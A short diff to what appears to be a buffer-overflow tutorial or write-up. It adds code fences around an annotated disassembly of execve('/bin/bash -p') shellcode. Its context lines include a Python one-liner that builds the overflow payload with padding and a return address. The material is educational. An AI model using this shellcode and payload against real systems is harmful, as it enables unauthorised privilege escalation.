@@ -88,6 +88,7 @@ Consider the following instructions:
 python -c 'import struct; shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"; print(shellcode + "A"*(80-len(shellcode)) + struct.pack("<I", 0x804a008))' > /tmp/payload
 ```
 
+```assembler
 6a 0b           push 0xb          ; syscall 11 = execve
 58              pop eax           ; eax = 11
 99              cdq               ; edx = 0
@@ -104,6 +105,7 @@ python -c 'import struct; shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\
 53              push ebx          ; argv[0] = "/bin/bash"
 89 e1           mov ecx, esp      ; ecx = argv
 cd 80           int 0x80          ; SYSCALL : execve(ebx, ecx, edx)
+```
 
 We then need to inject this shellcode like so:
 
